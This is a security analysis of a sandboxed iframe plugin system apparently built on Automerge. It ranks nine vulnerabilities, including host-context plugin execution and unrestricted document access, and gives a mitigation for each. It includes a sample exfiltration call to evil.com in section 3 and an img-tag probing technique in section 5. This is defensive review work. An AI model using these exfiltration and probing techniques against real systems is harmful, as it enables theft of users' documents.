# Security analysis: third-party tools in `isolated-patchwork-view`

## Threat model

A third-party tool runs inside a **srcdoc iframe** with `sandbox="allow-scripts"` (no `allow-same-origin`). It gets an opaque origin, a CSP starting from `default-src 'none'`, and three MessagePort channels: repo sync, bootstrap (closed early), and capnweb RPC.

Sidebar and document toolbar tools are assumed trusted (or will be moved into `isolated-patchwork-view` in the future). This analysis focuses on document-area tools rendered via `isolated-patchwork-view` using the `iframe-tool` / `isolated-frame` pattern.

## Vulnerability summary

| # | Vulnerability | Severity | Exploitability |
|---|---|---|---|
| # | Vulnerability | Severity | Exploitability |
| 1 | Plugin entry module executes in host context | **Critical** | Trivial — side effects in index module |
| 2 | Unrestricted repo document access | **Critical** | Trivial — `repo.find(url)` |
| 3 | ~~`AllowAllPolicy` enables exfiltration via RPC~~ | ~~High~~ **Mitigated** | `RestrictivePolicy` is now the default |
| 4 | `onOpenDocument` unvalidated navigation | **Medium** | Easy — single RPC call |
| 5 | Browser-initiated loads bypass policy | **Medium** | Moderate — requires host SW cooperation |
| 6 | Registry leaks workspace metadata | **Low–Medium** | Trivial — `registry.list()` |
| 7 | Indirect IndexedDB corruption via repo | Covered by #2 | Same as #2 |
| 8 | `unsafe-eval` CSP | **Low** | Amplifier, not standalone |
| 9 | `postMessage("*")` race | **Low** | Unlikely in practice |

## 1. Plugin entry module executes in host context (CRITICAL)

**Location:** `patchwork-next/core/bootloader/src/site.ts` (ModuleWatcher `onModuleLoaded` callback)

When a plugin is installed, `ModuleWatcher` discovers it and calls `importModuleFromFolderDocUrl()` to load its entry point module. This runs in the **host page context** — not inside any iframe sandbox. The host then reads `mod.plugins` from the module's exports and passes the array to `registerPlugins()`, which only stores metadata.

The `registerPlugins()` call itself is safe — it just stores description objects. The problem is the step before it: the entry module is `import()`-ed and its top-level code executes in the host context with full access to the host DOM, IndexedDB, network, and every other browser API.

**Attack:** A malicious plugin puts side effects in its entry module (the file that exports the `plugins` array). For well-behaved plugins this file just defines metadata with a lazy `load: async () => (await import('./tool')).default`, but nothing enforces this. A malicious entry module can:

- **Access the host's DOM** — read or modify the page, inject scripts, intercept events.
- **Access the host's IndexedDB** — read, modify, or delete any database, including the Automerge document store.
- **Make arbitrary network requests** — exfiltrate data to external servers (no CSP restriction in the host context).
- **Access the host's Automerge Repo** — if the repo is reachable from module scope (e.g., as a global or via a closure), the plugin can read/write any document.
- **Tamper with other plugins** — modify the plugin registry, monkey-patch shared modules, intercept RPC channels.

**Impact:** Complete host compromise. The iframe sandbox is irrelevant because the code runs before any isolation boundary is involved.

**Why this is worse than the other vulnerabilities:** All other vulnerabilities in this document assume the attacker's code runs inside the sandboxed iframe. This one bypasses the sandbox entirely — the attacker's code runs with the same privilege as the host application itself.

**Mitigation:** The entry module must not be executed in the host context. Options include:

- **Static metadata extraction** — require plugins to declare metadata in `package.json` (or a separate JSON manifest) rather than in executable JavaScript. The host reads the manifest without importing the module. Module code is only ever loaded inside the sandboxed iframe.
- **Sandboxed discovery** — run `ModuleWatcher` module imports inside a sandboxed iframe or worker, extract the `plugins` array via structured clone / RPC, and register it in the host without ever evaluating the module in the host context.
- **Code review gate** — if the above are too complex short-term, require manual review/approval of plugin entry modules before they are imported. This is a process control, not a technical control.

## 2. Unrestricted Automerge document access (CRITICAL)

**Location:** `srcdoc.ts:217–225`, `index.ts:560–567`

The iframe's ephemeral Repo is connected directly to the host Repo via `MessageChannelNetworkAdapter` with no document-level filtering. The iframe repo uses `sharePolicy: () => true`. The ARCHITECTURE.md explicitly acknowledges this as an open problem (line 250).

**Attack:** A malicious tool calls `repo.find(automerge:anyDocumentId)` and the host repo syncs it. The tool can:

- **Read any document** the host repo knows about (private notes, credentials, other users' shared docs).
- **Write to any document** — Automerge's CRDT merge is permissionless; once a tool has a handle, it can call `handle.change()`.
- **Enumerate documents** — the Automerge repo protocol includes peer-to-peer discovery messages; the tool could observe sync messages to learn document IDs it wasn't given.

**Impact:** Full read/write access to the user's entire document store. This is the single largest vulnerability.

**Mitigation:** The `FilteredBridge` exists in the built `dist/` directory but is not wired into the live code path. Re-enable it with a strict allowlist: only the `docUrl` passed in the init message, plus documents explicitly granted via `requestDocument()` with user consent.

## 3. ~~`AllowAllPolicy` on `loadModuleSource` / `fetchResource`~~ (MITIGATED)

**Status:** Fixed. `RestrictivePolicy` is now the default.

**What was wrong:** The default `ResourcePolicy` was `AllowAllPolicy`, which returned `true` for every URL. Since `HostApi.loadModuleSource()` and `HostApi.fetchResource()` call `fetch()` on the host page's origin, a tool could call `hostStub.fetchResource("https://evil.com/exfil?data=...")` and the host would perform the fetch, bypassing the iframe's CSP entirely. This enabled data exfiltration, SSRF-style probing, and reading host-origin resources (including automerge documents via service worker URL resolution).

**What changed:** `RestrictivePolicy` (`resource-policy.ts`) is now the default policy, created per iframe with the host origin and resolved importmap URLs. It enforces three rules:

1. **Importmap URLs are always allowed** — the known set of framework/library module URLs resolved at init time.
2. **Cross-origin URLs are blocked** — `parsed.origin !== hostOrigin` rejects requests to external servers. Relative URLs (e.g., `/assets/foo.wasm`) are resolved against the host origin before checking, so legitimate same-origin paths pass.
3. **Automerge document IDs in URL paths are blocked** — each path segment is URI-decoded and rejected if it starts with `automerge:`, preventing tools from reading documents via the host's service worker URL resolution.

Opaque `__plugin__/` URLs are resolved by `OpaqueUrlMapper.toReal()` before the policy check and bypass it entirely — this is correct, as those are the host's own mapping for tool source code.

**Remaining residual risk:** The policy allows all same-origin non-automerge paths. A tool could probe for the existence of host-served static assets. This is low-severity since the assets are public to any same-origin code anyway.

## 4. `onOpenDocument` has no validation (MEDIUM)

**Location:** `index.ts:347–361`

The RPC method `onOpenDocument(url, toolId?, title?, docType?)` dispatches an `OpenDocumentEvent` with no validation. The host site handler parses the URL and navigates to it.

**Attack:**

- A tool can cause the host to **navigate to any automerge document**, potentially one the user didn't intend to open.
- If the target document is opened with a **tool of the attacker's choosing** (via the `toolId` parameter), the attacker could chain this with a malicious tool that now runs in a trusted context (if sidebar/toolbar tools are trusted).
- The `title` and `docType` parameters could be used for **UI spoofing** (showing a misleading document name).

**Mitigation:** Validate `onOpenDocument` parameters: confirm the URL is a valid automerge URL the tool was authorized to reference, restrict `toolId` to tools in the registry, and sanitize title/type.

## 5. Browser-initiated loads bypass ResourcePolicy (MEDIUM)

**Location:** ARCHITECTURE.md lines 240–244, `srcdoc.ts:362–375`

CSP allows `img-src`, `style-src`, `font-src`, `media-src` from the host origin. These are real HTTP requests that hit the host's server/service worker directly, bypassing the RPC `ResourcePolicy`.

**Attack:** A tool inserts `<img src="http://host-origin/%automerge%3Axyz.../sensitive-file">` — the browser fetches it directly from the host. While the response won't be readable as text (CSP blocks `connect-src`), the tool can observe timing and `onload`/`onerror` to probe for document existence. If the host's service worker resolves automerge URLs for any request (not just JS modules), the tool could use `<img>` tags to exfiltrate data via URL-encoded query parameters to the host, then read back via a known side channel.

**Mitigation:** The host origin server/service worker should enforce per-session authentication on automerge URL paths, or restrict automerge URL resolution to the RPC channel only.

## 6. `PluginRegistryCapability` leaks metadata (LOW–MEDIUM)

**Location:** `index.ts:223–268`, `rpc-types.ts:46–76`

The `PluginRegistryCapability` lets the iframe call `list("patchwork:tool")` and `list("patchwork:datatype")` to enumerate all registered plugins and datatypes. While importUrls are opaque, the metadata includes `id`, `name`, `supportedDatatypes`, `tags`, etc.

**Attack:**

- **Enumeration:** A malicious tool learns every tool and datatype installed in the user's workspace, which reveals what kinds of documents they work with.
- **`getFallbackTool(docUrl)` / `getSupportedTools(docUrl)`** — accepts an arbitrary `docUrl`, so a tool can probe whether a document exists and what type it is, even if it wasn't authorized to access that document.

**Mitigation:** Scope registry queries to the tool's own context — e.g., only allow `getFallbackTool` for the document URL the tool was initialized with and documents it was explicitly granted.

## 7. IndexedDB: not directly vulnerable, but reachable through repo

**Location:** `srcdoc.ts:217` (Repo created with no storage adapter)

The srcdoc iframe has an opaque origin so it cannot access the host's IndexedDB directly. The iframe's ephemeral Repo is created without `IndexedDBStorageAdapter`. Good — this is safe.

**However:** The host Repo connected via `MessageChannelNetworkAdapter` at `index.ts:562` is backed by IndexedDB. Since there's no document-level filtering (vulnerability #2), a tool can use the repo channel to reach documents that are only in IndexedDB (never explicitly loaded in the current session). The tool doesn't touch IndexedDB directly, but effectively has read/write access to its contents through the repo.

**Clearing IndexedDB:** A tool cannot directly call `indexedDB.deleteDatabase()` on the host's databases (opaque origin prevents it). But via vulnerability #2, a tool could **corrupt or delete document contents** via `handle.change()` on any document, which the host repo would persist to IndexedDB. This is functionally equivalent to clearing data.

Note that vulnerability #1 (host-context plugin execution) makes this even worse — a malicious plugin entry module runs in the host context and *can* call `indexedDB.deleteDatabase()` directly.

## 8. `eval` / dynamic code execution in the iframe (LOW)

**Location:** CSP `script-src 'unsafe-eval'` in `srcdoc.ts:364`

`unsafe-eval` is required by es-module-shims. A malicious tool can use `eval()` freely, but this is mainly a concern if combined with other vulnerabilities (e.g., if a tool can load arbitrary module source via `loadModuleSource`, it already has code execution — `eval` doesn't add much).

The real risk is that `eval` makes it easier for a compromised tool to execute obfuscated or dynamically constructed payloads, making static analysis of tool code harder.

## 9. `postMessage` init handshake race (LOW)

**Location:** `index.ts:583–602`

The init message is posted with `targetOrigin: "*"` (necessary because the srcdoc iframe has a null origin). If another frame could intercept this message, it would receive the three MessagePorts.

**In practice:** The iframe is created by the host element and there's an epoch guard, making interception unlikely. But `"*"` as targetOrigin is worth noting — any code with a reference to the iframe's `contentWindow` could theoretically race the message.

## What's already working well

- **Origin isolation** via `sandbox="allow-scripts"` (no `allow-same-origin`) — prevents direct access to host DOM, cookies, localStorage, IndexedDB, and service workers.
- **CSP from `default-src 'none'`** — blocks direct network access (`connect-src blob:` only), nested iframes, workers, plugins, and form submissions.
- **Opaque URL mapping** — automerge document IDs for tool source code never flow host → iframe.
- **Bootstrap channel restrictions** — only serves importmap URLs, closed after capnweb loads.
- **Fetch proxy constraints** — GET/HEAD only, no request bodies.
- **capnweb RPC** — type-safe, capability-oriented; good foundation for tightening access over time.

## Recommended priority

1. **Stop executing plugin entry modules in the host context** — extract metadata from a static manifest or run discovery in a sandbox (fixes #1).
2. **Wire up `FilteredBridge`** with a per-tool document allowlist (fixes #2 and #7).
3. ~~**Implement a real `ResourcePolicy`** that blocks external origins and automerge URL paths (fixes #3).~~ **Done** — `RestrictivePolicy` is now the default.
4. **Validate `onOpenDocument` parameters** on the host side (fixes #4).
5. **Scope `PluginRegistryCapability` queries** to authorized documents (fixes #6).
6. **Restrict host SW automerge URL resolution** to the RPC channel (fixes #5).
